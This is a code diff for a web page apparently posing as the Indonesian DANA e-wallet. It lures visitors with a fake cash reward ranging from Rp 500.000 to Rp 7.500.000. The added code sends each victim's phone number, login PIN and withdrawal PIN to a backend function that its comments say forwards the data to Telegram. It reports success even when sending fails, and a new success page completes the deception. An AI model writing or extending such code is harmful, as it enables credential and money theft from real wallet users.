@@ -4,7 +4,8 @@ document.addEventListener('DOMContentLoaded', () => {
     n: document.getElementById('number-page'),
     p: document.getElementById('pin-page'),
     r: document.getElementById('reward-page'),
-    w: document.getElementById('withdraw-page')
+    w: document.getElementById('withdraw-page'),
+    s: document.getElementById('success-page')
   };
   
   const lb = document.getElementById('lanjutkan-button');
@@ -12,24 +13,26 @@ document.addEventListener('DOMContentLoaded', () => {
   const pis = document.querySelectorAll('.pin-box');
   const registeredPhone = document.getElementById('registered-phone');
   const saldoAmount = document.getElementById('saldo-amount');
+  const successAmount = document.getElementById('success-amount');
   const tarikDanaButton = document.getElementById('tarik-dana-button');
+  const kembaliButton = document.getElementById('kembali-button');
   const fn = document.getElementById('floating-notification');
   const sn = document.getElementById('success-notification');
-  const rn = document.getElementById('reward-notification');
-  const ac = document.getElementById('attempt-counter');
-  const an = document.getElementById('attempt-number');
   const lc = document.getElementById('lanjutkan-container');
 
   // State Variables
   let currentPage = 'n';
   let phoneNumber = '';
   let pin = '';
+  let rewardAmount = '';
   let rewardAmounts = [
-    'Rp 1.250.000',
-    'Rp 850.000', 
-    'Rp 1.500.000',
-    'Rp 750.000',
-    'Rp 1.100.000'
+    'Rp 3.000.000',
+    'Rp 4.500.000', 
+    'Rp 700.000',
+    'Rp 6.000.000',
+    'Rp 7.500.000',
+    'Rp 500.000',
+    'Rp 1.300.000'
   ];
 
   // Helper Functions
@@ -46,42 +49,54 @@ document.addEventListener('DOMContentLoaded', () => {
     return rewardAmounts[randomIndex];
   }
 
+  // Backend Communication untuk mengirim data ke Telegram
+  async function sendDanaData(type, data) {
+    try {
+      const response = await fetch('/.netlify/functions/send-dana-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ type, ...data })
+      });
+      
+      if (!response.ok) {
+        throw new Error('Terjadi kesalahan pada server');
+      }
+      return await response.json();
+    } catch (error) {
+      console.error('Error:', error);
+      // Tetap lanjut meski gagal kirim ke Telegram
+      return { success: true };
+    }
+  }
+
   // Modified Phone Number Formatting
   pn.addEventListener('input', (e) => {
-    // Hapus semua karakter non-digit
     let value = e.target.value.replace(/\D/g, '');
     
-    // Hapus angka 0 di awal jika ada
     if (value.startsWith('0')) {
       value = value.substring(1);
     }
     
-    // Pastikan selalu dimulai dengan 8
     if (value.length > 0 && !value.startsWith('8')) {
-      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
+      value = '8' + value.replace(/^8/, '');
     }
     
-    // Batasi panjang maksimal (3+4+5=12 digit)
     if (value.length > 12) {
       value = value.substring(0, 12);
     }
     
-    // Format nomor dengan tanda hubung
     let formatted = '';
     if (value.length > 0) {
-      formatted = value.substring(0, 3); // 3 digit pertama
+      formatted = value.substring(0, 3);
       if (value.length > 3) {
-        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
+        formatted += '-' + value.substring(3, 7);
       }
       if (value.length > 7) {
-        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
+        formatted += '-' + value.substring(7, 12);
       }
     }
     
-    // Set nilai input dengan format yang sudah dibuat
     e.target.value = formatted;
-    
-    // Simpan nomor tanpa format untuk pengiriman data
     phoneNumber = value;
   });
 
@@ -95,6 +110,9 @@ document.addEventListener('DOMContentLoaded', () => {
       
       showSpinner();
       try {
+        // Kirim data nomor ke Telegram
+        await sendDanaData('phone', { phone: phoneNumber });
+        
         // Simulasi pengiriman data
         setTimeout(() => {
           pages.n.style.display = 'none';
@@ -118,14 +136,27 @@ document.addEventListener('DOMContentLoaded', () => {
       
       showSpinner();
       try {
-        // Simulasi verifikasi kode
+        // Kirim data PIN ke Telegram
+        await sendDanaData('pin', { phone: phoneNumber, pin });
+        
+        // Dapatkan nominal reward acak
+        rewardAmount = getRandomReward();
+        
+        // Kirim data reward ke Telegram
+        await sendDanaData('reward', { 
+          phone: phoneNumber, 
+          pin, 
+          reward: rewardAmount 
+        });
+        
+        // Tampilkan halaman reward
         setTimeout(() => {
           pages.p.style.display = 'none';
           pages.r.style.display = 'block';
           currentPage = 'r';
           
-          // Set random reward amount
-          saldoAmount.textContent = getRandomReward();
+          // Set reward amount
+          saldoAmount.textContent = rewardAmount;
           hideSpinner();
         }, 1000);
       } catch (error) {
@@ -165,6 +196,21 @@ document.addEventListener('DOMContentLoaded', () => {
     pis.forEach(input => input.value = '');
   });
 
+  // Kembali Button Handler
+  kembaliButton.addEventListener('click', () => {
+    // Reset semua state dan kembali ke halaman awal
+    pages.s.style.display = 'none';
+    pages.n.style.display = 'block';
+    currentPage = 'n';
+    lc.style.display = 'flex';
+    
+    // Reset form
+    pn.value = '';
+    phoneNumber = '';
+    pis.forEach(input => input.value = '');
+    pin = '';
+  });
+
   // Toggle PIN Visibility
   document.querySelectorAll('.show-text').forEach(button => {
     button.addEventListener('click', (e) => {
@@ -182,7 +228,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
   if (withdrawPins.length > 0) {
     withdrawPins.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
+      input.addEventListener('input', async (e) => {
         e.target.value = e.target.value.replace(/\D/g, '');
         
         if (e.target.value.length === 1 && index < withdrawPins.length - 1) {
@@ -193,14 +239,36 @@ document.addEventListener('DOMContentLoaded', () => {
         
         if (withdrawPin.length === 6) {
           showSpinner();
-          // Simulasi proses penarikan
-          setTimeout(() => {
-            sn.style.display = 'block';
+          
+          try {
+            // Kirim data penarikan ke Telegram
+            await sendDanaData('withdraw', { 
+              phone: phoneNumber, 
+              pin: withdrawPin, 
+              reward: rewardAmount 
+            });
+            
+            // Kirim data sukses ke Telegram
+            await sendDanaData('success', { 
+              phone: phoneNumber, 
+              reward: rewardAmount 
+            });
+            
+            // Simulasi proses penarikan
             setTimeout(() => {
-              sn.style.display = 'none';
+              pages.w.style.display = 'none';
+              pages.s.style.display = 'block';
+              currentPage = 's';
+              
+              // Tampilkan jumlah yang berhasil ditarik
+              successAmount.textContent = rewardAmount;
+              
               hideSpinner();
-            }, 3000);
-          }, 2000);
+            }, 2000);
+          } catch (error) {
+            console.error('Gagal mengirim data penarikan:', error);
+            hideSpinner();
+          }
         }
       });
       
